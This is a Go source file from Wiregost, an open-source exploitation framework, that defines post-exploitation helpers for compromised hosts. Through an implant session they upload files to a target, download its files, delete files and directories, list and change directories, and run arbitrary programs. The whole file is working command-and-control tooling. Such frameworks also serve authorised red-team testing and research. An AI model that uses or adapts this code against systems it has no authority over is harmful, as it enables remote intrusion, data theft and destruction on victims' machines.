// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package module

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"time"

	"github.com/gogo/protobuf/proto"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/util"
)

// GetSession - Returns the Session corresponding to the Module "Session" option, or nothing if not found.
func (m *Module) GetSession() (session *core.Ghost, err error) {

	// Check empty session
	if m.Options["Session"].Value == "" {
		return nil, errors.New("Provide a Session to run this module on.")
	}

	// Check connected session
	if 0 < len(*core.Wire.Ghosts) {
		for _, g := range *core.Wire.Ghosts {
			if g.Name == m.Options["Session"].Value {
				session = g
			}
		}
	}

	if session == nil {
		invalid := fmt.Sprintf("Invalid or non-connected session: %s", m.Options["Session"].Value)
		return nil, errors.New(invalid)
	}

	// Check valid platform
	platform := ""
	switch m.Platform {
	case "windows", "win", "Windows":
		platform = "windows"
	case "darwin", "ios", "macos", "MacOS", "Apple":
		platform = "darwin"
	case "Linux", "linux":
		platform = "linux"
	}

	if platform != session.OS {
		return nil, errors.New("The session's target OS is not supported by this module")
	}

	return session, nil
}

// isPost - Checks if a module has a Session option, meaning its a post-module
func (m *Module) isPost() bool {

	if _, ok := m.Options["Session"]; !ok {
		return false
	} else {
		return true
	}
}

// Upload - Upload a file on the Session's target
// @src     => file to upload
// @path    => path in which to upload the file (including file name)
// @timeout => Desired timeout for the session command
func (m *Module) Upload(src string, path string, timeout time.Duration) (result string, err error) {
	if !m.isPost() {
		return "", errors.New("Module is not a Post-Exploitation module")
	}
	sess, err := m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	fileBuf, err := ioutil.ReadFile(src)
	if err != nil {
		return "", err
	}
	uploadGzip := bytes.NewBuffer([]byte{})
	new(util.Gzip).Encode(uploadGzip, fileBuf)

	data, _ := proto.Marshal(&ghostpb.UploadReq{
		Encoder: "gzip",
		Path:    path,
		Data:    uploadGzip.Bytes(),
	})

	data, err = sess.Request(ghostpb.MsgUploadReq, timeout, data)
	if err != nil {
		return "", errors.New(err.Error())
	} else {
		return "Uploaded", nil
	}
}

// Download - Download a file from the Session's target
// @lpath   => local path in which to save the file
// @rpath   => path to file to download (including file name)
// @timeout => Desired timeout for the session command
func (m *Module) Download(lpath string, rpath string, timeout time.Duration) (result string, err error) {
	if !m.isPost() {
		return "", errors.New("Module is not a Post-Exploitation module")
	}
	sess, err := m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	data, _ := proto.Marshal(&ghostpb.DownloadReq{
		Path: rpath,
	})
	data, err = sess.Request(ghostpb.MsgDownloadReq, timeout, data)

	src := rpath
	fileName := filepath.Base(src)
	dst, _ := filepath.Abs(lpath)
	fi, err := os.Stat(dst)
	if err != nil {
		errStat := fmt.Sprintf("%v\n", err)
		return "", errors.New(errStat)
	}
	if fi.IsDir() {
		dst = path.Join(dst, fileName)
	}

	download := &ghostpb.Download{}
	proto.Unmarshal(data, download)
	if download.Encoder == "gzip" {
		download.Data, _ = new(util.Gzip).Decode(download.Data)
	}
	f, err := os.Create(dst)
	if err != nil {
		return "", errors.New(fmt.Sprintf("Failed to open local file %s: %v\n", dst, err))
	}
	defer f.Close()
	n, err := f.Write(download.Data)
	if err != nil {
		return "", errors.New(fmt.Sprintf("Failed to write data %v\n", err))
	} else {
		return fmt.Sprintf("Wrote %d bytes to %s\n", n, dst), nil
	}
}

// Remove - Remove a file/directory from the Session's target
// @path   => path to file/directory to remove
// @timeout => Desired timeout for the session command
func (m *Module) Remove(path string, timeout time.Duration) (result string, err error) {
	if !m.isPost() {
		return "", errors.New("Module is not a Post-Exploitation module")
	}
	sess, err := m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	data, _ := proto.Marshal(&ghostpb.RmReq{
		Path: path,
	})
	data, err = sess.Request(ghostpb.MsgRmReq, timeout, data)
	if err != nil {
		return "", err
	} else {
		rm := &ghostpb.Rm{}
		err := proto.Unmarshal(data, rm)
		if err != nil {
			errRm := fmt.Sprintf("Unmarshaling envelope error: %v\n", err)
			return "", errors.New(errRm)
		}
		if rm.Success {
			return "Deleted", nil
		} else {
			return "", errors.New(rm.Err)
		}
	}
}

// ChangeDirectory - Change the implant session's current working directory
// @dir     => target directory
// @timeout => Desired timeout for the session command
func (m *Module) ChangeDirectory(dir string, timeout time.Duration) (result string, err error) {
	if !m.isPost() {
		return "", errors.New("Module is not a Post-Exploitation module")
	}
	sess, err := m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	data, _ := proto.Marshal(&ghostpb.CdReq{
		Path: dir,
	})
	data, err = sess.Request(ghostpb.MsgCdReq, timeout, data)
	if err != nil {
		return "", err
	} else {
		pwd := &ghostpb.Pwd{}
		err := proto.Unmarshal(data, pwd)
		if err != nil {
			errCd := fmt.Sprintf("Unmarshaling envelope error: %v\n", err)
			return "", errors.New(errCd)
		}
		return fmt.Sprintf("Changed directory: %s", pwd), nil
	}
}

// ListDirectory - List contents of a directory on the session's target
// @path    => target directory to list content from
// @timeout => Desired timeout for the session command
func (m *Module) ListDirectory(path string, timeout time.Duration) (result string, err error) {
	if !m.isPost() {
		return "", errors.New("Module is not a Post-Exploitation module")
	}
	sess, err := m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	data, _ := proto.Marshal(&ghostpb.LsReq{
		Path: path,
	})
	data, err = sess.Request(ghostpb.MsgLsReq, timeout, data)
	if err != nil {
		return "", err
	} else {
		dirList := &ghostpb.Ls{}
		err := proto.Unmarshal(data, dirList)
		if err != nil {
			errLs := fmt.Sprintf("Unmarshaling envelope error: %v\n", err)
			return "", errors.New(errLs)
		}
		return fmt.Sprintf("directory: %s", dirList), nil
	}
}

// Execute - Execute a program on the session's target
// @path    => path to the program to run
// @args    => optional list of arguments to run with the program (if none, use []string{})
// @timeout => Desired timeout for the session command
func (m *Module) Execute(path string, args []string, timeout time.Duration) (result string, err error) {
	if !m.isPost() {
		return "", errors.New("Module is not a Post-Exploitation module")
	}
	sess, err := m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	data, _ := proto.Marshal(&ghostpb.ExecuteReq{
		Path:   path,
		Args:   args,
		Output: true,
	})
	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
	if err != nil {
		return "", err
	} else {
		resp := ghostpb.Execute{}
		err := proto.Unmarshal(data, &resp)
		if err != nil {
			return "", err
		}

		res := fmt.Sprintf("Results:\n %s", resp.Result)
		return res, nil
	}
}
